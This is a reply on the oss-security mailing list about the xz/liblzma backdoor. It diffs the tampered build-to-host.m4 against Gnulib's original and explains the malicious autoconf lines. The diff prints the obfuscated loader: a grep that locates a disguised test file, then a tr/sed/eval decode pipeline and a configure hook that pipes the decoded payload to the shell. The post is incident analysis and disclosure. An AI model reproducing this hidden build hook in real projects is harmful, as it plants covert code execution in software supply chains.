Received: (qmail 30599 invoked by uid 550); 30 Mar 2024 12:59:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9589 invoked from network); 30 Mar 2024 06:21:32 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1711779682; x=1712384482; darn=lists.openwall.com;
        h=content-transfer-encoding:subject:from:to:content-language
         :user-agent:mime-version:date:message-id:from:to:cc:subject:date
         :message-id:reply-to;
        bh=gkr9diSa2fohLhWZap5GGhDFaLWDul0F/1khL6JORnU=;
        b=aXOOk2j8mUUU3q+GOF9DOB6j0HHwQtWgacByz8tpt7QL+NHcZic/vDoGKHcGOhi3YJ
         6g8i9vTL5LcH3zls+7yHUlcoXehdf6hGQG9uikN+kGTsDxxEnHVHdSrdgit4PLWmaDo4
         UypVNC6L+UcjUzlD0BndY1x3F2w38jWw88TStbMKxZAQt/A498VDtIL2cJ1wFnkiACoI
         84OZUyx5P4DBtBsbfgxfhawNtBMrGQjiM34enVUeWgtrJC/VusfD1vP7ClGmr9QYUbne
         vp2CgVyV0z2JR375wNKEzZU0WTV2HodEtNt5v96WheIjKOHhD6+65iYyD5U4MNOJG1XS
         WxMw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1711779682; x=1712384482;
        h=content-transfer-encoding:subject:from:to:content-language
         :user-agent:mime-version:date:message-id:x-gm-message-state:from:to
         :cc:subject:date:message-id:reply-to;
        bh=gkr9diSa2fohLhWZap5GGhDFaLWDul0F/1khL6JORnU=;
        b=rYoYpVyyCI6+LSFvgD44f/o3GpW/d7ojGMGXf8MfsPg6+uLwNJED2LaC1F44/DPI3c
         0hwcZ2/a902paapaThPu2PRDoyj0EYDH19cGyVbdXzmfNhVbpfVLFgM3qRlVm1U2tJe7
         io0sdDScV1lMI9ImBzVH0zx5A4hokSQV1IUOi6o0FLTrV8XTOQRRyGgcQYHa7fjN2Xm/
         vL+iVUvKgBpv8SWN7w2jHx6XZzH3HIt06VvpwOzulQxFs29F3Eu5oP/P7sfvcKUdqbc6
         2wFTWRl2jiM3ANblsHy6QiqnVF2iQENs30acli9vvGp9SNwMDhDxf2RfeE2Ccdk6cn3I
         j4Fw==
X-Gm-Message-State: AOJu0YyQKJBCC9P6+d4tX89da2S3JxfXGqrr3rIfOxg7wtdFTQ9TREh4
	/4Qv98r34PdPfG6pN9RV/rRhuXFPuYOC4LI3WU5TpouCZ4lwwDpnzIecsbxMv8M=
X-Google-Smtp-Source: AGHT+IEmNb/cz0S5/lfhUjw0q724LCXSdyB8a2mlz6seJv7MS594BRSzQqkb0hURN1DT9AYMnsnZyA==
X-Received: by 2002:a05:6a00:21cf:b0:6ea:c9c3:94a5 with SMTP id t15-20020a056a0021cf00b006eac9c394a5mr5180869pfj.0.1711779681641;
        Fri, 29 Mar 2024 23:21:21 -0700 (PDT)
Message-ID: <19f0dd87-cc99-4333-8f91-50dd443e61de@gmail.com>
In-Reply-To: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
Date: Fri, 29 Mar 2024 23:21:19 -0700
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: oss-security@lists.openwall.com, andres@anarazel.de
From: Collin Funk <collin.funk1@gmail.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit
Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh server compromise

I am not subscribed to this list, sorry for the missing Reply-To.

It looks like they copied the build-to-host.m4 file from Gnulib and
made malicious modifications, hoping no one would notice [1].
Hopefully this diff will help lead anyone investigating it in the
correct direction:

$ diff -u m4/build-to-host.m4 $GNULIB_REFDIR/m4/build-to-host.m4 
--- m4/build-to-host.m4	2024-03-29 21:52:50.956049825 -0700
+++ /home/collin/.local/src/gnulib/m4/build-to-host.m4	2024-03-29 22:37:06.424791077 -0700
@@ -1,4 +1,4 @@
-# build-to-host.m4 serial 30
+# build-to-host.m4 serial 3
 dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
@@ -37,7 +37,6 @@
 
   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
-  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -59,40 +58,14 @@
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
-  if test "x$gl_am_configmake" != "x"; then
-    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
-  else
-    gl_[$1]_config=''
-  fi
-  _LT_TAGDECL([], [gl_path_map], [2])dnl
-  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
-  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
-  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
-  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
-
-  dnl If the host conversion code has been placed in $gl_config_gt,
-  dnl instead of duplicating it all over again into config.status,
-  dnl then we will have config.status run $gl_config_gt later, so it
-  dnl needs to know what name is stored there:
-  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])
 
 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
-  dnl Search for Automake-defined pkg* macros, in the order
-  dnl listed in the Automake 1.10a+ documentation.
-  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
-  if test -n "$gl_am_configmake"; then
-    HAVE_PKG_CONFIGMAKE=1
-  else
-    HAVE_PKG_CONFIGMAKE=0
-  fi
-
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
-  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl


It is pretty clear that this line:

   gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`

is checking for and saving 'tests/files/bad-3-corrupt_lzma2.xz'.

I don't think HAVE_PKG_CONFIGMAKE is used anywhere but I could be
missing something.

The '[$1]' in variable names seems to expand to 'locale'. See these
lines from ./configure:

gl_[$1]_prefix
gl_[$1]_config
gl_config_gt="eval \$gl_localedir_config"
gl_localedir_config='`$ECHO "$gl_localedir_config" | $SED "$delay_single_quote_subst"`'
gl_localedir_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"

Hopefully that can help someone who is more versed in Autoconf and m4.
Thanks for the work testing and discovering this.

[1] https://git.savannah.gnu.org/cgit/gnulib.git/tree/m4/build-to-host.m4

Collin
